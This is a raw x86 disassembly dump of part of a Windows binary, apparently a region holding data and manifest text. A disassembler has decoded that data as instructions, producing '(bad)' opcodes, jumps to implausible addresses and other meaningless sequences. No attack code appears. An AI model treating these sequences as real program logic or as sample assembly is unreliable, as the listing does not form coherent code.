  40dca7:	sub    DWORD PTR [edi-0x6c],edx
  40dcaa:	mov    edi,0xbe2cb847
  40dcaf:	out    dx,al
  40dcb0:	adc    esi,DWORD PTR [eax+eax*1+0x6e722e00]
  40dcb7:	jb     0x40dcdb
  40dcb9:	jne    0x40dd31
  40dcbb:	or     cl,BYTE PTR ds:0x69616f63
  40dcc1:	gs jae 0x40dd05
  40dcc4:	or     ah,BYTE PTR [ebx+0x61]
  40dcc7:	outs   dx,DWORD PTR ds:[esi]
  40dcc8:	bound  esp,QWORD PTR [ebp+0x65]
  40dccb:	cmp    al,0x20
  40dccd:	push   ebx
  40dcce:	inc    ebx
  40dccf:	inc    esp
  40dcd0:	jae    0x40dcfb
  40dcd2:	dec    ebp
  40dcd3:	jns    0x40dd49
  40dcd5:	gs je  0x40dcf8
  40dcd8:	jns    0x40dcfa
  40dcda:	outs   dx,BYTE PTR ds:[esi]
  40dcdb:	je     0x40dd42
  40dcdd:	and    dh,BYTE PTR [ebx+0x4d]
  40dce0:	dec    ebp
  40dce1:	cs outs dx,BYTE PTR gs:[esi]
  40dce4:	arpl   WORD PTR [esi+0x28],bp
  40dce7:	ds jb  0x40dd26
  40dcea:	gs je  0x40dd5f
  40dced:	and    BYTE PTR [ecx+0x44],al
  40dcf0:	cmp    bh,BYTE PTR [ecx+0xd]
  40dcf3:	popa   
  40dcf4:	jb     0x40dd5b
  40dcf6:	jb     0x40dd20
  40dcf8:	jb     0x40dd69
  40dcfa:	and    BYTE PTR [esi+0x73],dh
  40dcfd:	cmp    eax,0x61ac
  40dd02:	add    BYTE PTR [ebx-0x74747475],cl
  40dd08:	mov    ecx,DWORD PTR [ebx+0x4e448b8b]
  40dd0e:	dec    edx
	...
  40dd17:	add    BYTE PTR [ebp+0x45],al
  40dd1a:	aas    
  40dd1b:	enter  0x71,0xe1
  40dd1f:	outs   dx,DWORD PTR ds:[esi]
  40dd20:	add    BYTE PTR [eax+0x78980c51],0xab
  40dd27:	ret    
  40dd28:	gs inc ebp
  40dd2a:	pop    es
  40dd2b:	cli    
  40dd2c:	cmc    
  40dd2d:	int3   
  40dd2e:	jmp    0x45b7b397
  40dd33:	inc    ebp
  40dd34:	data16 fsub st(3),st
  40dd37:	add    ecx,esi
  40dd39:	pop    es
  40dd3a:	arpl   WORD PTR [edx],bx
  40dd3c:	call   0xdebd54f7
  40dd41:	xchg   BYTE PTR [esi-0x1a],bh
  40dd44:	sbb    eax,DWORD PTR [ecx-0x3e]
  40dd47:	std    
  40dd48:	or     al,0xd9
  40dd4a:	dec    esi
  40dd4b:	mov    ds:0x83ea88c,eax
  40dd50:	adc    DWORD PTR [ebp+0x45],eax
  40dd53:	and    eax,0x4545899d
  40dd58:	cdq    
  40dd59:	test   eax,0xdc004500
  40dd5e:	pop    ds
  40dd5f:	rcr    DWORD PTR [esi],0x5
  40dd62:	or     eax,0x75a58810
  40dd67:	xor    esi,esp
  40dd69:	mov    al,0x32
  40dd6b:	mov    ebp,esi
  40dd6d:	leave  
  40dd6e:	and    ah,bh
  40dd70:	mov    ch,0x40
  40dd72:	shl    BYTE PTR [esi-0x29],1
  40dd75:	add    BYTE PTR [eax],al
  40dd77:	add    BYTE PTR [eax-0x7dffffa7],bh
  40dd7d:	mov    al,ds:0xff000000
  40dd82:	(bad)  
  40dd83:	(bad)  
  40dd84:	(bad)  
  40dd85:	(bad)  
  40dd86:	(bad)  
  40dd87:	(bad)  
  40dd88:	(bad)  
  40dd89:	jmp    FWORD PTR [edx]
  40dd8b:	(bad)  
  40dd8c:	mov    BYTE PTR [edi-0xc],bl
  40dd8f:	cld    
  40dd90:	cmp    edi,eax
  40dd92:	push   0xb06b6858
  40dd97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd98:	jg     0x40dd2e
  40dd9a:	xchg   edx,eax
  40dd9b:	jp     0x40dd2f
  40dd9d:	(bad)  
  40dd9e:	dec    ebx
  40dd9f:	sbb    ecx,DWORD PTR [esi+0x69]
  40dda5:	add    BYTE PTR [eax],al
  40dda7:	add    BYTE PTR [eax],al
  40dda9:	add    BYTE PTR [eax],al
  40ddab:	or     BYTE PTR [eax],cl
  40ddad:	in     eax,dx
  40ddae:	dec    esp
  40ddaf:	or     eax,0x2f0808d6
  40ddb4:	int3   
  40ddb5:	inc    eax
  40ddb6:	nop
  40ddb7:	mov    edi,0xb3d28b1d
  40ddbc:	xchg   esi,eax
  40ddbd:	retf   0xe142
  40ddc0:	pop    edx
  40ddc1:	popf   
  40ddc2:	fnsave [ecx+edx*4-0x10d34a01]
  40ddc9:	and    al,0xac
  40ddcb:	cwde   
  40ddcc:	mov    ds,ebx
  40ddce:	mov    al,0x67
  40ddd0:	(bad)  
  40ddd1:	cdq    
  40ddd2:	or     al,0x39
  40ddd4:	pop    ds
  40ddd5:	test   al,0x8
  40ddd7:	or     BYTE PTR [eax+0x2e080848],ah
  40dddd:	xlat   BYTE PTR ds:[ebx]
  40ddde:	stc    
  40dddf:	or     BYTE PTR [eax],al
  40dde1:	aaa    
  40dde2:	jmp    0x40de29
  40dde4:	sar    BYTE PTR [ecx+0x13c0cde8],0x17
  40ddeb:	mov    bh,0x39
  40dded:	outs   dx,DWORD PTR ds:[esi]
  40ddee:	cwde   
  40ddef:	or     edi,DWORD PTR [edx-0x38]
  40ddf2:	mov    ds,WORD PTR [edi+esi*8]
  40ddf5:	out    0x38,al
  40ddf7:	xor    BYTE PTR [edx-0x24000000],al
  40ddfd:	int3   
  40ddfe:	(bad)  
  40ddff:	push   ebp
  40de00:	mov    DWORD PTR [ebp-0x1ea6a37e],edi
  40de06:	ss dec esp
  40de08:	inc    edx
  40de09:	xchg   BYTE PTR [ecx+0xc],ch
  40de0c:	push   0xb29d59b9
  40de11:	ret    0x679b
  40de14:	mov    ebx,DWORD PTR fs:0x4384
  40de1b:	mov    edx,0xdb26
  40de20:	add    al,al
  40de22:	rol    al,0xc0
  40de25:	rol    al,0xc0
  40de28:	rol    al,0x8f
  40de2b:	mov    esp,edx
	...
  40de35:	add    BYTE PTR [esp+esi*2+0x51],dh
  40de39:	xchg   edi,eax
  40de3a:	stc    
  40de3b:	aam    0xa6
  40de3d:	mov    bl,0xad
  40de3f:	dec    ebx
  40de40:	sbb    eax,0x1e411731
  40de45:	js     0x40de73
  40de47:	enter  0x4fa1,0xc1
  40de4b:	jns    0x40de55
  40de4d:	push   edi
  40de4e:	xchg   ecx,eax
  40de4f:	jle    0x40dec5
  40de51:	je     0x40ddf3
  40de53:	loopne 0x40dec9
  40de55:	je     0x40deb7
  40de57:	xchg   DWORD PTR [esp+esi*2-0x7d],esi
  40de5b:	out    0x95,al
  40de5d:	retf   
  40de5e:	adc    BYTE PTR [edx+0x32d57c78],dl
  40de64:	pop    edi
  40de65:	(bad)  
  40de66:	xchg   ebp,eax
  40de67:	add    al,0xe0
  40de69:	pop    ebp
  40de6a:	push   esp
  40de6b:	jecxz  0x40de5e
  40de6d:	mov    edi,0x2bd9671e
  40de72:	je     0x40ddfd
  40de74:	iret   
  40de75:	popf   
  40de76:	cli    
  40de77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de78:	mov    DWORD PTR [ecx+0x7d54389],ecx
  40de7e:	pusha  
  40de7f:	leave  
  40de80:	push   edi
  40de81:	xchg   ebx,eax
  40de82:	xchg   ebx,eax
  40de83:	dec    ecx
  40de84:	mov    dh,0x37
  40de86:	inc    esp
  40de87:	xchg   esp,eax
  40de88:	icebp  
  40de89:	add    al,0xf6
  40de8b:	pop    ebx
  40de8c:	xchg   edi,eax
  40de8d:	stos   DWORD PTR es:[edi],eax
  40de8e:	add    DWORD PTR [eax],ecx
  40de90:	and    edi,DWORD PTR [ecx]
  40de92:	ficomp DWORD PTR [eax]
  40de94:	dec    esp
  40de95:	jne    0x40de5e
  40de97:	sub    cl,BYTE PTR [eax-0x44]
  40de9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de9b:	inc    edx
  40de9c:	test   BYTE PTR [eax+0x38b18989],ch
  40dea2:	mov    DWORD PTR [ecx+0x89],ecx
  40dea8:	add    BYTE PTR [eax],al
  40deaa:	add    BYTE PTR [eax],al
  40deac:	add    BYTE PTR [eax],al
  40deae:	inc    esp
  40deaf:	(bad)  
  40deb0:	idiv   bh
  40deb2:	(bad)  
  40deb3:	(bad)  
  40deb4:	(bad)  
  40deb5:	(bad)  
  40deb6:	(bad)  
  40deb7:	(bad)  
  40deb8:	(bad)  
  40deb9:	push   DWORD PTR [esp+esi*2+0x4b]
  40debd:	cwde   
  40debe:	pop    esi
  40debf:	data16 jge 0x40ded1
  40dec2:	mov    al,0x6b
  40dec4:	and    DWORD PTR [edi+edx*2-0x71],eax
  40dec8:	xor    BYTE PTR [esi],0xef
  40decb:	loope  0x40ded9
  40decd:	je     0x40deae
  40decf:	test   BYTE PTR [edi+0x7],ah
  40ded2:	add    eax,0xb37474a0
  40ded7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded8:	adc    eax,0x5a8dcf92
  40dedd:	add    DWORD PTR [esi+0xd],edi
  40dee0:	fstp   QWORD PTR [edx+edx*8+0x60c2c4d9]
  40dee7:	test   cl,cl
  40dee9:	dec    edi
  40deea:	inc    eax
  40deeb:	pop    edi
  40deec:	imul   ebx,DWORD PTR ds:0x50d4aa20,0xffffffa0
  40def3:	je     0x40df69
  40def5:	jg     0x40df18
  40def7:	ds je  0x40df6e
  40defa:	adc    BYTE PTR ds:0xb58d7443,ch
  40df00:	test   al,0x56
  40df02:	dec    ebx
  40df03:	push   edx
  40df04:	and    ebp,ebx
  40df06:	and    ebx,esp
  40df08:	xchg   BYTE PTR [edi+0xafdc56],ch
  40df0e:	dec    esp
  40df0f:	(bad)  
  40df10:	int3   
  40df11:	pop    ss
  40df12:	sti    
  40df13:	lock fmul QWORD PTR [esi+0x3c8d8d8d]
  40df1b:	imul   ecx,DWORD PTR [ebp-0x72990f73],0xffffff8d
  40df22:	push   bx
  40df24:	bound  esi,QWORD PTR [esi+0x28]
  40df27:	jbe    0x40df49
  40df29:	bound  ecx,QWORD PTR ds:0x6d6d6520
  40df2f:	jb     0x40df92
  40df31:	jo     0x40df86
  40df33:	das    
  40df34:	jo     0x40df89
  40df36:	outs   dx,BYTE PTR ds:[esi]
  40df37:	imul   esp,DWORD PTR gs:[esi+0x6f],0x786c6165
  40df3f:	arpl   WORD PTR [edx+0x74],sp
  40df42:	gs cs gs arpl WORD PTR ds:[eax+0x63],si
  40df49:	and    BYTE PTR [ecx+0x62],ch
  40df4c:	outs   dx,BYTE PTR ds:[esi]
  40df4d:	ins    DWORD PTR es:[edi],dx
  40df4e:	ds je  0x40dfa4
  40df51:	sub    BYTE PTR [ebx+0x76],ah
  40df54:	gs gs ins DWORD PTR es:[edi],dx
  40df57:	jns    0x40dfc6
  40df59:	jo     0x40dfd1
  40df5b:	je     0x40df9e
  40df5d:	cmp    dh,BYTE PTR [ebx+0x6d]
  40df60:	and    BYTE PTR [ecx+0x74],ch
  40df63:	ins    BYTE PTR es:[edi],dx
  40df64:	ins    DWORD PTR es:[edi],dx
  40df65:	bound  ebp,QWORD PTR [ecx+0x69]
  40df68:	jo     0x40dfa6
  40df6a:	jb     0x40dfd9
  40df6c:	data16 jae 0x40dfe1
  40df6f:	dec    ebp
  40df70:	ins    DWORD PTR es:[edi],dx
  40df71:	push   ebx
  40df72:	push   ebx
  40df73:	jae    0x40dfda
  40df75:	ins    DWORD PTR es:[edi],dx
  40df76:	bound  esp,QWORD PTR [ebp+0x2e]
  40df79:	inc    ecx
  40df7a:	outs   dx,BYTE PTR ds:[esi]
  40df7b:	arpl   WORD PTR [eax],sp
  40df7d:	cs inc esp
  40df7f:	gs outs dx,DWORD PTR gs:[esi]
  40df82:	jo     0x40dff6
  40df84:	ins    DWORD PTR es:[edi],dx
  40df85:	inc    edi
  40df86:	lea    eax,[eax]
	...
  40df90:	push   0x413ceee3
  40df95:	inc    eax
  40df96:	xchg   DWORD PTR [edx+0x43373851],esp
  40df9c:	mov    eax,ds:0xe05eff2
  40dfa1:	scas   al,BYTE PTR es:[edi]
  40dfa2:	cli    
  40dfa3:	in     al,0xa5
  40dfa5:	mov    ds:0xcd78,eax
  40dfaa:	add    BYTE PTR [eax],al
  40dfac:	add    BYTE PTR [eax],al
  40dfae:	add    BYTE PTR [eax],al
  40dfb0:	add    al,ch
  40dfb2:	call   0xcd70c41b
  40dfb7:	call   0xb24f09a4
  40dfbc:	fistp  WORD PTR [ebp+0x23382194]
  40dfc2:	je     0x40df5b
  40dfc4:	cld    
  40dfc5:	cmp    ebx,DWORD PTR [eax+edi*1+0x35]
  40dfc9:	hlt    
  40dfca:	ins    BYTE PTR es:[edi],dx
  40dfcb:	ror    ah,1
  40dfcd:	and    DWORD PTR [ebx+0x66],esp
  40dfd0:	cmp    eax,0x2f6005f1
  40dfd5:	lea    edx,[esi-0x7ad87fde]
  40dfdb:	cdq    
  40dfdc:	call   0xe90e38c9
  40dfe1:	call   0xe8881596
  40dfe6:	dec    DWORD PTR [ecx+0x3f]
  40dfe9:	cmp    DWORD PTR [eax-0x546535f8],ecx
  40dfef:	sub    al,0xe6
  40dff1:	mov    DWORD PTR [eax+0x57],ecx
  40dff4:	xor    edi,DWORD PTR [esi-0x41]
  40dff7:	xor    dl,dh
  40dff9:	test   al,0x64
  40dffb:	mov    ?,WORD PTR [eax]
  40dffd:	xor    bl,bh
  40dfff:	(bad)  
  40e000:	(bad)  
  40e001:	jmp    ebp
  40e003:	mov    ecx,0xd53c2273
  40e008:	cmp    al,0x2f
  40e00a:	cld    
  40e00b:	xlat   BYTE PTR ds:[ebx]
  40e00c:	jns    0x40dfa2
  40e00e:	test   al,0x30
  40e010:	sub    al,0xe
  40e012:	sahf   
  40e013:	fldl2e 
  40e015:	adc    eax,0xa155716b
  40e01a:	mov    bl,0xac
  40e01c:	push   es
  40e01d:	cld    
  40e01e:	mov    al,ds:0xf466ffff
  40e023:	mov    ?,edi
  40e025:	(bad)  
  40e026:	inc    DWORD PTR [eax]
	...
  40e030:	mov    esp,0x801a
	...
  40e03d:	add    BYTE PTR [edi+0x54],bl
  40e040:	popa   
  40e041:	sbb    edx,edx
  40e043:	xor    al,0x84
  40e045:	cmp    BYTE PTR [ebp+0x1a5e331e],ah
  40e04b:	and    al,0x7c
  40e04d:	aas    
  40e04e:	jp     0x40dfef
  40e050:	xchg   ecx,eax
  40e051:	fld    TBYTE PTR [ebx+0x8f0f78]
  40e057:	add    BYTE PTR [eax],dl
  40e059:	inc    esp
  40e05a:	add    BYTE PTR [eax],al
  40e05c:	shr    al,0x0
  40e05f:	add    BYTE PTR [esi-0x153cf211],dh
  40e065:	(bad)  
  40e066:	aaa    
  40e067:	cmp    eax,0x5c5d21f2
  40e06c:	mov    ebx,0xa48aa044
  40e071:	dec    edi
  40e072:	cmp    DWORD PTR [edx],esp
  40e074:	loop   0x40e002
  40e076:	mov    bl,0xb2
  40e078:	add    BYTE PTR [eax],al
  40e07a:	xchg   esp,eax
  40e07b:	cli    
  40e07c:	push   esi
  40e07d:	sbb    DWORD PTR [eax],eax
  40e07f:	add    BYTE PTR [eax],al
  40e081:	nop
  40e082:	ins    DWORD PTR es:[edi],dx
  40e083:	inc    ecx
  40e084:	in     eax,0xdd
  40e086:	jp     0x40e01c
  40e088:	ja     0x40e06c
  40e08a:	mov    ebx,0xace24fd5
  40e08f:	bound  esp,QWORD PTR [eax*4+0x4eb730c7]
  40e096:	push   ecx
  40e097:	outs   dx,DWORD PTR ds:[esi]
  40e098:	inc    ebx
  40e099:	repnz lea ebp,[edi]
  40e09c:	scas   eax,DWORD PTR es:[edi]
  40e09d:	adc    al,0xa7
  40e09f:	das    
  40e0a0:	dec    eax
  40e0a1:	or     edi,DWORD PTR [ebp+0x76]
  40e0a4:	add    BYTE PTR [eax],al
  40e0a6:	mov    dl,0x8
  40e0a8:	add    BYTE PTR [eax],al
  40e0aa:	add    BYTE PTR [ebx],dh
  40e0ac:	xor    esi,DWORD PTR [ebx]
  40e0ae:	xor    esi,DWORD PTR [ebx]
  40e0b0:	xor    esi,DWORD PTR [ebx]
  40e0b2:	xor    esi,DWORD PTR [ebx]
  40e0b4:	mov    eax,0x89890fbd
  40e0b9:	mov    DWORD PTR [ecx-0x76767677],ecx
  40e0bf:	mov    DWORD PTR [eax],eax
  40e0c1:	add    ah,dh
  40e0c3:	popf   
  40e0c4:	sbb    ecx,DWORD PTR [eax]
  40e0c6:	jge    0x40e072
  40e0c8:	mov    BYTE PTR [edx-0x5bb39900],bh
  40e0ce:	cmp    DWORD PTR [eax],ebx
  40e0d0:	mov    ds:0x694bf6ec,al
  40e0d5:	mov    edi,0x2abb253a
  40e0da:	add    BYTE PTR [eax],al
  40e0dc:	(bad)  
  40e0dd:	leave  
  40e0de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0df:	and    BYTE PTR [esi],ah
  40e0e1:	(bad)  
  40e0e2:	jae    0x40e152
  40e0e4:	int    0x2
  40e0e6:	or     eax,0x810b6253
  40e0eb:	dec    esp
  40e0ec:	and    edx,DWORD PTR [eax+0x55941d39]
  40e0f2:	mul    DWORD PTR [edx]
  40e0f4:	mov    DWORD PTR [edi+0x5b03c1],edi
  40e0fa:	add    al,ah
  40e0fc:	in     al,0x52
  40e0fe:	add    BYTE PTR [eax],al
  40e100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e101:	mov    edx,0x870000a6
  40e106:	jp     0x40e11b
  40e108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e109:	sbb    bl,al
  40e10b:	jo     0x40e119
  40e10d:	lods   al,BYTE PTR fs:[esi]
  40e10f:	push   ds
  40e110:	cmp    dl,BYTE PTR ds:0x14ce0833
  40e116:	adc    edx,edx
  40e118:	jmp    0xca403a61
  40e11d:	add    BYTE PTR [eax],al
  40e11f:	add    BYTE PTR [eax+0x1d0000fb],cl
  40e125:	jp     0x40e127
  40e127:	add    BYTE PTR [eax],al
  40e129:	(bad)  
  40e12a:	(bad)  
  40e12b:	(bad)  
  40e12c:	(bad)  
  40e12d:	(bad)  
  40e12e:	(bad)  
  40e12f:	(bad)  
  40e130:	(bad)  
  40e131:	dec    DWORD PTR [edx+0x3c]
  40e134:	xor    eax,0xd0932766
  40e139:	out    0xf0,eax
  40e13b:	pop    DWORD PTR [eax]
  40e13d:	aas    
  40e13e:	jp     0x40e0cd
  40e140:	mov    edx,0xa1ca3e0a
  40e145:	jno    0x40e1b5
  40e147:	into   
  40e148:	adc    dh,BYTE PTR [ebx-0x75]
  40e14b:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40e151:	mov    ecx,DWORD PTR [ebx+0x7437ffff]
  40e157:	mov    gs,WORD PTR [edx]
  40e159:	(bad)  
  40e15a:	(bad)  
  40e15b:	(bad)  
  40e15c:	jp     0x40e122
  40e15e:	jp     0x40e19e
  40e160:	push   ebx
  40e161:	sbb    al,0x5e
  40e163:	cmp    dh,BYTE PTR [ebx]
  40e165:	int3   
  40e166:	mov    esp,0xbba7c594
  40e16b:	aaa    
  40e16c:	inc    esi
  40e16d:	xchg   DWORD PTR [ebx+ebp*8],eax
  40e170:	sbb    BYTE PTR [esi-0x11b27eab],bl
  40e176:	test   dl,dl
  40e178:	mov    gs,WORD PTR [ebx+0x2e]
  40e17b:	cmc    
  40e17c:	mov    ch,0xb3
  40e17e:	(bad)  
  40e17f:	(bad)  
  40e180:	frstor [ecx-0x1]
  40e183:	(bad)  
  40e184:	jmp    0x63d7:0xffff8ee2
  40e18b:	add    DWORD PTR [edi-0x63],ebp
  40e18e:	mov    cl,0x25
  40e190:	jmp    0xcfc:0x190123ec
  40e197:	aam    0xea
  40e199:	lods   al,BYTE PTR ds:[esi]
  40e19a:	jle    0x40e184
  40e19c:	and    BYTE PTR ds:0xffdd3220,cl
  40e1a2:	(bad)  
  40e1a3:	call   edx
  40e1a5:	xor    al,dh
  40e1a7:	or     al,0x9e
  40e1a9:	push   ds
  40e1aa:	lea    esp,[ebx]
  40e1ac:	outs   dx,BYTE PTR ds:[esi]
  40e1ad:	fistp  DWORD PTR [ebp+0x45ab8bf2]
  40e1b3:	add    BYTE PTR [esi],ch
  40e1b5:	sub    bh,BYTE PTR [edi-0x7e]
  40e1b8:	out    dx,al
  40e1b9:	(bad)  
  40e1ba:	stc    
  40e1bb:	inc    ebx
  40e1bc:	sti    
  40e1bd:	mov    ds:0xff1459f9,eax
  40e1c2:	push   DWORD PTR [ecx]
  40e1c4:	mov    edx,DWORD PTR [edx+0xfffffff]
  40e1ca:	(bad)  
  40e1cb:	(bad)  
  40e1cc:	(bad)  
  40e1cd:	(bad)  
  40e1ce:	(bad)  
  40e1cf:	(bad)  
  40e1d0:	(bad)  
  40e1d1:	paddq  mm0,QWORD PTR ds:0xffffff8f
  40e1d8:	(bad)  
  40e1d9:	(bad)  
  40e1da:	(bad)  
  40e1db:	(bad)  
  40e1dc:	(bad)  
  40e1dd:	inc    DWORD PTR [eax]
  40e1df:	add    BYTE PTR ds:0x461e917a,dh
  40e1e5:	or     eax,0x48704b44
  40e1ea:	xor    al,0x98
  40e1ec:	or     al,0x2b
  40e1ee:	aam    0x7c
  40e1f0:	jne    0x40e19a
  40e1f2:	jae    0x40e1a9
  40e1f4:	shl    ch,0xd3
  40e1f7:	stos   BYTE PTR es:[edi],al
  40e1f8:	add    BYTE PTR [eax],al
  40e1fa:	jp     0x40e190
  40e1fc:	add    BYTE PTR [eax],al
  40e1fe:	adc    edi,DWORD PTR [ebx+0x0]
  40e201:	add    BYTE PTR [esi-0x4630cb6f],dl
  40e207:	add    al,0x2c
  40e209:	ss loopne 0x40e28b
  40e20c:	pop    esp
  40e20d:	sti    
  40e20e:	mov    esi,0x9b8fd0c2
  40e213:	push   ss
  40e214:	sbb    BYTE PTR [ebx+0xcd8d23d],cl
  40e21a:	add    al,al
  40e21c:	adc    dl,BYTE PTR [ebx]
  40e21e:	mov    ds:0xc0c0c0f8,eax
  40e223:	inc    ecx
  40e224:	inc    edi
  40e225:	daa    
  40e226:	(bad)  
  40e227:	cmp    eax,0x567bb12
  40e22c:	(bad)  
  40e22d:	hlt    
  40e22e:	mov    bh,0x15
  40e230:	int3   
  40e231:	jnp    0x40e274
  40e233:	loopne 0x40e1eb
  40e235:	test   al,0xd3
  40e237:	out    dx,al
  40e238:	sub    ebx,DWORD PTR [ecx]
  40e23a:	cmp    eax,0xce6a222
  40e23f:	lea    eax,[ebx+0x4d5c70c4]
  40e245:	repnz rol al,0x7d
  40e249:	cmp    eax,eax
  40e24b:	rol    al,0x89
  40e24e:	mov    DWORD PTR [ecx-0x76767677],ecx
  40e254:	mov    DWORD PTR [ecx+0x74c9556b],ecx
  40e25a:	je     0x40e2d0
  40e25c:	je     0x40e2d2
  40e25e:	je     0x40e2d4
  40e260:	je     0x40e2d6
  40e262:	mov    ecx,DWORD PTR [ebx-0xf15b0e9]
  40e268:	mov    eax,DWORD PTR [edi-0x494f4366]
  40e26e:	js     0x40e2e4
  40e270:	outs   dx,BYTE PTR ds:[esi]
  40e271:	and    ebp,DWORD PTR [ecx+0x6c]
  40e274:	and    BYTE PTR [ebp+0x65],ah
  40e277:	jbe    0x40e299
  40e279:	jns    0x40e2ee
  40e27b:	push   edi
  40e27c:	jae    0x40e2d1
  40e27e:	imul   esp,DWORD PTR [edx],0x72726576
  40e284:	gs jbe 0x40e2f5
  40e287:	imul   esp,DWORD PTR [ebp+0x67],0x65727243
  40e28e:	ins    DWORD PTR es:[edi],dx
  40e28f:	jns    0x40e2f9
  40e291:	gs inc ecx
  40e293:	ds je  0x40e2fb
  40e296:	and    BYTE PTR [ebp+0x2e],ch
  40e299:	popa   
  40e29a:	arpl   WORD PTR [ebx+0x65],si
  40e29d:	ds jbe 0x40e2ed
  40e2a0:	gs and BYTE PTR gs:[edi+0x79],ch
  40e2a5:	outs   dx,BYTE PTR ds:[esi]
  40e2a6:	jae    0x40e315
  40e2a8:	popa   
  40e2a9:	jb     0x40e30f
  40e2ab:	push   ebx
  40e2ac:	imul   ecx,DWORD PTR gs:0x746d6573,0x792c6372
  40e2b7:	bound  esp,QWORD PTR [ecx+0x2e]
  40e2ba:	jns    0x40e290
  40e2bc:	ret    0xe7f5
  40e2bf:	xchg   ebp,eax
  40e2c0:	jno    0x40e2e1
  40e2c2:	cmp    eax,0x3c01f419
  40e2c7:	ror    BYTE PTR [ebx-0x3dd01175],1
  40e2cd:	(bad)  [ebx+0x41221d3c]
  40e2d3:	mov    edi,0x58bca20e
  40e2d8:	(bad)  
  40e2d9:	in     al,0x42
  40e2db:	out    0x53,eax
  40e2dd:	push   esi
  40e2de:	sbb    ebp,DWORD PTR [edx-0x58f7a530]
  40e2e4:	push   ds
  40e2e5:	out    dx,eax
  40e2e6:	loopne 0x40e273
  40e2e8:	mov    ecx,ebx
  40e2ea:	shr    DWORD PTR [esi-0x75],cl
  40e2ed:	mov    ecx,ebp
  40e2ef:	idiv   BYTE PTR [edx-0x75e83375]
  40e2f5:	mov    BYTE PTR [ebp-0x2e1e568c],dl
  40e2fb:	mov    ss,WORD PTR [ebx+0xc]
  40e2fe:	jmp    0x80a3:0x5969ed1b
  40e305:	pop    edx
  40e306:	pop    edx
  40e307:	test   al,0x37
  40e309:	sub    edi,DWORD PTR ds:0x96cccccc
  40e30f:	into   
  40e310:	int3   
  40e311:	int3   
  40e312:	(bad)  
  40e313:	mov    esi,0xe8cccccc
  40e318:	call   0xe929cc05
  40e31d:	call   0x42d5cc0a
  40e322:	daa    
  40e323:	dec    ebx
  40e324:	inc    edx
  40e325:	jne    0x40e34a
  40e327:	mov    eax,ds:0xef28ae4b
  40e32c:	arpl   bx,sp
  40e32e:	mov    ebp,?
  40e330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e331:	mov    ebx,0x1c6422f
  40e336:	lods   al,BYTE PTR ds:[esi]
  40e337:	or     al,BYTE PTR [eax]
	...
  40e341:	mov    DWORD PTR [ecx+0x6eb78cb0],ecx
  40e347:	mov    DWORD PTR [ecx+0x35c2dbf0],ecx
  40e34d:	ret    0x4838
  40e350:	rcl    BYTE PTR ds:0xed8553d1,0x84
  40e357:	mov    esi,0xfca56f95
  40e35c:	and    eax,0xf79e66ec
  40e361:	pop    edi
  40e362:	in     eax,dx
  40e363:	xchg   ecx,eax
  40e364:	popa   
  40e365:	sbb    DWORD PTR [esi],0xf25e8b02
  40e36b:	push   es
  40e36c:	mov    DWORD PTR [ecx-0x7676ad0d],ecx
  40e372:	jne    0x40e3eb
  40e374:	call   0x50a2:0xb1cd0089
  40e37b:	(bad)  
  40e37c:	sbb    esi,DWORD PTR [esi]
  40e37e:	sbb    al,0x56
  40e380:	sbb    BYTE PTR [edi+ecx*8-0x4a0959c2],ch
  40e387:	psllq  mm5,QWORD PTR [eax-0x4a]
  40e38b:	jmp    0x40e337
  40e38d:	adc    eax,0x10
  40e392:	dec    eax
  40e393:	(bad)  
  40e394:	pop    ebp
  40e395:	mov    ebp,ss
  40e397:	retf   0x4043
  40e39a:	and    ch,BYTE PTR [eax]
  40e39c:	iret   
  40e39d:	pop    es
  40e39e:	fstp   DWORD PTR [esi+0x3f9d5e1a]
  40e3a4:	sbb    al,0x39
  40e3a6:	lds    ebp,FWORD PTR [edi-0x53]
  40e3a9:	jmp    0xa1:0x9d7d5d29
  40e3b0:	add    BYTE PTR [ebx+0x7c],dl
  40e3b3:	pop    edi
  40e3b4:	add    BYTE PTR [eax],al
  40e3b6:	add    BYTE PTR [ebp+0x45],al
  40e3b9:	inc    ebp
  40e3ba:	inc    ebp
  40e3bb:	inc    ebp
  40e3bc:	inc    ebp
  40e3bd:	inc    ebp
  40e3be:	inc    ebp
  40e3bf:	inc    ebp
  40e3c0:	add    eax,0xf0f7b16
  40e3c5:	(bad)  
  40e3c6:	(bad)  
  40e3c7:	(bad)  
  40e3c8:	(bad)  
  40e3c9:	(bad)  
  40e3ca:	(bad)  
  40e3cb:	psubsb mm5,mm0
  40e3ce:	sbb    edi,DWORD PTR es:[ecx-0x5]
  40e3d2:	(bad)  
  40e3d3:	push   edx
  40e3d4:	lahf   
  40e3d5:	shl    DWORD PTR fs:[esi+eiz*1],1
  40e3d9:	sub    al,0x58
  40e3db:	jmp    0x2ece5ef7
  40e3e0:	dec    edi
  40e3e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3e2:	and    bl,ch
  40e3e4:	test   eax,ebp
  40e3e6:	call   0xe84e06d3
  40e3eb:	call   0xe9299027
  40e3f0:	neg    BYTE PTR [ecx]
  40e3f2:	xchg   ax,ax
  40e3f4:	push   edi
  40e3f5:	lahf   
  40e3f6:	sti    
  40e3f7:	pop    ss
  40e3f8:	mov    bl,BYTE PTR [ecx]
  40e3fa:	rol    DWORD PTR [ebx+eiz*8],1
  40e3fd:	in     al,dx
  40e3fe:	and    eax,0xba031808
  40e403:	repnz dec ebp
  40e405:	ret    0x7972
  40e408:	call   0xae53950d
  40e40d:	mov    esp,0xa9000000
  40e412:	pcmpeqd mm3,QWORD PTR [eax+edx*1-0x79]
  40e417:	xor    ch,BYTE PTR [ecx+ecx*1-0x61]
  40e41b:	push   cs
  40e41c:	sbb    ecx,esp
  40e41e:	mov    eax,0xa776c754
  40e423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e424:	sahf   
  40e425:	mov    ebp,0x7c5d7789
  40e42a:	ror    ebp,0x1d
  40e42d:	scas   eax,DWORD PTR es:[edi]
  40e42e:	and    ah,cl
  40e430:	fidivr WORD PTR [ebp+0xa8fa]
  40e436:	push   ecx
